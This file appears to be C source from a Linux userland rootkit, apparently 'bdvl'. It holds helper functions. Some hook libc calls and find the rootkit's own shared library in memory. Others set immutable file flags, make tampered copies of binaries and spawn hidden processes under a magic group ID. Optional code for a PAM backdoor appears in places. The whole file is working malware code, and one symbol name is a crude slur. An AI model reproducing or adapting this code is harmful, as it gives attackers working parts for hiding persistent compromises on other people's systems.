int rm(const char *path);

/* recursively removes the target directory. */
void eradicatedir(const char *target){
    DIR *dp;
    struct dirent *dir;
    struct stat pathstat;

    hook(COPENDIR, CREADDIR, CRMDIR, C__XSTAT);

    dp = call(COPENDIR, target);
    if(dp == NULL) return;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        char path[strlen(target)+strlen(dir->d_name)+2];
        snprintf(path, sizeof(path), "%s/%s", target, dir->d_name);

        memset(&pathstat, 0, sizeof(struct stat));
        if((long)call(C__XSTAT, _STAT_VER, path, &pathstat) != -1)
            if(S_ISDIR(pathstat.st_mode))
                eradicatedir(path); // we recursive.

        if(rm(path) < 0)
            printf("Failed unlink on %s\n", path);
    }
    closedir(dp);
    if((long)call(CRMDIR, target) < 0 && errno != ENOENT && errno != ENOTDIR)
        printf("Failed rmdir on %s\n", target);
}

int rm(const char *path){
    hook(CUNLINK);
    int ulr = (long)call(CUNLINK, path);
    if(ulr < 0 && errno == ENOENT) return 1;
    else if(ulr < 0 && errno == EISDIR) eradicatedir(path);
    return ulr;
}

int chown_path(const char *path, gid_t gid){
    hook(CCHOWN);
    return (long)call(CCHOWN, path, gid, gid);
}

int notuser(uid_t id){
    if(getuid() != id && geteuid() != id)
        return 1;
    return 0;
}

int isfedora(void){
    int acc, fedora=0;
    hook(CACCESS);
    acc = (long)call(CACCESS, "/etc/fedora-release", F_OK);
    acc == 0 ? fedora = 1 : 0;
    return fedora;
}

#define O_NONBLOCK      0x0004      /* no delay */

int doiapath(const char *path, int apply){
    int fd, ret, chk;
    off_t fpendlen;

    hook(COPEN, CIOCTL);

    fd = (long)call(COPEN, path, O_NONBLOCK);
    if(fd < 0) return 0;

    fpendlen = lseek(fd, 0, SEEK_END);
    if(fpendlen < 1 && apply) return 0;

    if((long)call(CIOCTL, fd, FS_IOC_GETFLAGS, &ret) < 0) {
        close(fd);
        return 0;
    }

    chk = ret;
    if(apply)  ret |= (FS_APPEND_FL|FS_IMMUTABLE_FL);
    if(!apply) ret &=~(FS_APPEND_FL|FS_IMMUTABLE_FL);

    if(ret != chk)
        if((long)call(CIOCTL, fd, FS_IOC_SETFLAGS, &ret) < 0){
            close(fd);
            return 0;
        }

    if(close(fd) == 0)
        return 1;

    return 0;
}

/* iterates through all loaded libraries until bdvl.so is located.
 * once located, the struct passed as an argument to the void pointer is populated with information of the located bdvl.so. */
int phdrcallback(struct dl_phdr_info *info, size_t size, void *data){
    struct bdvso *so = (struct bdvso*)data;
    void *handle = NULL;
    int (*fptr)(void);
    char *libname, *libpath, *pathdup, *pathdir;
    const char *target = info->dlpi_name;

    if(!strlen(target) || (handle = dlopen(target, RTLD_LAZY)) == NULL)
        return 0;

    if(!o_dlsym) locate_dlsym();
    fptr = o_dlsym(handle, "bdvlsuperreallygay");
    dlclose(handle);
    if(fptr == NULL) return 0;

    libpath = strdup(target);
    strncpy(so->sopath, libpath, 2047);

    pathdup = strdup(libpath);
    libname = strrchr(pathdup, '/')+1;
    strncpy(so->soname, libname, 511);
    free(pathdup);

    pathdir = dirname(libpath);
    strncpy(so->installdir, pathdir, 1023);
    free(libpath);

    return 0;
}

/* populates & returns a new pointer to a bdvso struct. thanks to dl_iterate_phdr.
 * the pointer should be freed immediately after there is no longer any use for it. */
struct bdvso *getbdvsoinf(void){
    if(so != NULL) return so;
    so = malloc(sizeof(struct bdvso));
    if(!so) return NULL;
    memset(so, 0, sizeof(struct bdvso));
    dl_iterate_phdr(phdrcallback, (void*)so);
    return so;
}

/* returns the full sopath for the kit.
 * if pointers installdir & bdvlso are NULL, the path of the kit is stored & read from in the bdvso struct, which is populated by dl_iterate_phdr.
 * if the path cannot be found, INSTALL_DIR & BDVLSO are used as fallbacks.
 * otherwise if installdir & bdvlso are not NULL, they are used. (i.e. at installation)
 * if box is fedora, .$PLATFORM is not included in the result. */
char *rksopath(char *installdir, char *bdvlso){
    char *rkpath, *rkpathdup, *p, *ret, tmp[2048];
    size_t pathsize;
    memset(tmp, 0, sizeof(tmp));

    if(installdir == NULL && bdvlso == NULL){
        so = getbdvsoinf();
        if(so == NULL){
            snprintf(tmp, sizeof(tmp)-1, "%s/%s.$PLATFORM", INSTALL_DIR, BDVLSO);
            goto nopenope;
        }

        rkpath = so->sopath;
        rkpathdup = strdup(rkpath);
        p = strrchr(rkpathdup, '.')+1;

        for(int i=0; i < VALID_PLATFORMS_SIZE; i++)
            if(!strcmp(valid_platforms[i], p)){
                rkpath[strlen(rkpath)-(strlen(valid_platforms[i])+1)] = '\0';
                break;
            }

        strncpy(tmp, rkpath, sizeof(tmp)-1);
        strcat(tmp, ".$PLATFORM");
        tmp[strlen(rkpath)+10]='\0';

        free(rkpathdup);
        free(so);
        so = NULL;
    }else snprintf(tmp, sizeof(tmp)-1, "%s/%s.$PLATFORM", installdir, bdvlso);
nopenope:
    pathsize = strlen(tmp)+1;
    ret = malloc(pathsize);
    if(!ret) return NULL;
    strncpy(ret, tmp, pathsize);
    if(isfedora()) ret[strlen(ret)-10]='\0';
    return ret;
}

char *gdirname(int fd){
    int readlink_status;
    char path[65], *filename = malloc(PATH_MAX+1);
    if(!filename) return NULL;
    memset(filename, 0, PATH_MAX+1);

    snprintf(path, sizeof(path)-1, "/proc/self/fd/%d", fd);

    hook(CREADLINK);
    readlink_status = (long)call(CREADLINK, path, filename, PATH_MAX);
    if(readlink_status < 0){
        free(filename);
        filename = NULL;
    }
    return filename;
}

#if defined(USE_PAM_BD) || defined(LOG_LOCAL_AUTH)
char *get_username(const pam_handle_t *pamh){
    void *u = NULL;
    if(pam_get_item(pamh, PAM_USER, (const void **)&u) != PAM_SUCCESS)
        return NULL;
    return (char *)u;
}
#endif

/* returns a blocksize for fsize. if MAX_BLOCK_SIZE is defined & the initial
 * blocksize is larger than that value, count is incremented until the blocksize
 * to be returned is lower than the defined MAX_BLOCK_SIZE. */
off_t getablocksize(off_t fsize){
    int count = BLOCKS_COUNT;
    off_t blksize = fsize/count;
#ifdef MAX_BLOCK_SIZE
    while(blksize > MAX_BLOCK_SIZE)
        blksize = fsize/count++;
#endif
    return blksize;
}

/* opens pathname for reading. the pointer tmp is a tmpfile() meant for filtered & manipulated contents of pathname.
 * if either fopen call fails NULL is returned & the calling function decides what to do. */
FILE *redirstream(const char *pathname, FILE **tmp){
    FILE *fp;

    hook(CFOPEN);

    fp = call(CFOPEN, pathname, "r");
    if(fp == NULL)
        return NULL;

    *tmp = tmpfile();
    if(*tmp == NULL){
        fclose(fp);
        return NULL;
    }

    return fp;
}

/* lstat on path. pointers fsize & mode are updated with st_size & st_mode.
 * fopen called on path for reading.
 * fopen called on newpath for writing a (likely tampered with) copy.
 * if any of the 3 calls fail NULL is returned.
 * if path is a link NULL is returned.
 * if the pointer nfp is NULL then newpath is not opened for writing in this call & instead is (likely) opened some point after this is called. */
FILE *bindup(const char *path, char *newpath, FILE **nfp, off_t *fsize, mode_t *mode){
    FILE *ret;
    struct stat bstat;
    int statr;

    hook(C__LXSTAT, CFOPEN);
    
    memset(&bstat, 0, sizeof(struct stat));
    statr = (long)call(C__LXSTAT, _STAT_VER, path, &bstat);
    if(statr < 0) return NULL;

    *mode = bstat.st_mode;
    if(S_ISLNK(*mode)) // never ever
        return NULL;
    *fsize = bstat.st_size;

    ret = call(CFOPEN, path, "rb");
    if(ret == NULL) return NULL;

    if(nfp != NULL){
        *nfp = call(CFOPEN, newpath, "wb+");
        if(*nfp == NULL){
            fclose(ret);
            return NULL;
        }
    }

    return ret;
}

/* closes all c FILE pointers passed as args. */
void fcloser(int c, ...){
    int i=0;
    FILE *fp;
    va_list va;
    va_start(va, c);
    while((fp = va_arg(va, FILE*)) != NULL && i++<c)
        fclose(fp);
    va_end(va);
}

/* returns a full path for a symlink destination into the kit's HOMEDIR. */
char *linkdest(int dest){
    char *name, *ret;
    size_t pathsize;

    name = linkdests[dest];
    pathsize = LEN_HOMEDIR+strlen(name)+2;
    
    ret = malloc(pathsize);
    if(!ret) return NULL;
    memset(ret, 0, pathsize);
    snprintf(ret, pathsize, "%s/%s", HOMEDIR, name);

    return ret;
}

/* creates a new process for whatever function fn points to.
 * passes arg along with it. once cloned, the target function
 * must setgid(MAGIC_GID) immediately if the calling process can.
 * the new process does not share memory with the parent therefore has its own stack. 
 * hence we free the allocated stack immediately after cloning. */
int sneakyclone(int (*fn)(void*), void *arg){
    const int STACK_SIZE = 8912;
    char *stack, *sptr;
    unsigned long flags = CLONE_PARENT|CLONE_DETACHED;
    int ret;

    stack = malloc(STACK_SIZE);
    if(!stack) return -1;
    sptr = stack+STACK_SIZE;

    !notuser(0) ? flags |= CLONE_NEWUTS : 0;
    ret = clone(fn, sptr, flags, arg);
    free(stack);
    return ret;
}